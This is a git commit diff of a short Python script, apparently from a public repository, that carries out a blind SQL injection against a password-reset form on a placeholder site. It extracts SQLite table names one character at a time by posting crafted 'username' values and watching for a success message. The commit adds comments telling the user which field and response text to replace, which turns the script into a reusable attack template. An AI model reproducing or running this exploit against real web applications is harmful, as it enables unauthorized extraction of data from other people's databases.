6b188ab83404a22be92fb551e2ee9a93ef36d257
aykutcanustun <46404406+aykutcanustun@users.noreply.github.com>
2020-06-19 23:30:48 +0300

    main.py

--- main.py
+++ main.py
@@ -1,8 +1,8 @@
 import requests
 
 s = requests.Session()
-query = "' or UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'),{},1)){} {}--"
-url = "https://vulnable.webpage.com/forgotPassword.php"
+query = "' or UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'),{},1)){} {}--" #Set query
+url = "https://vulnable.webpage.com/forgotPassword.php" #Set URL
 charSeaching = 1
 interval = 0
 finished = False
@@ -10,15 +10,15 @@ finished = False
 while not finished:
     for i in 44, 56, 68, 80, 92, 104, 116, 128:
         req = s.post(
-            url, data={"username": query.format(charSeaching, "<", str(i))})
-        if "Data Sent!" in str(req.text):
+            url, data={"username": query.format(charSeaching, "<", str(i))}) #Replace "username"
+        if "Data Sent!" in str(req.text):  #Replace "Data Sent!"
             interval = i
             break
 
     for i in range(interval-12, interval):
         req = s.post(
-            url, data={"username": query.format(charSeaching, "=", str(i))})
-        if "Data Sent!" in str(req.text):
+            url, data={"username": query.format(charSeaching, "=", str(i))}) #Replace "username"
+        if "Data Sent!" in str(req.text): #Replace "Data Sent!"
             charSeaching += 1
             finished = False
             print(chr(i), end="")
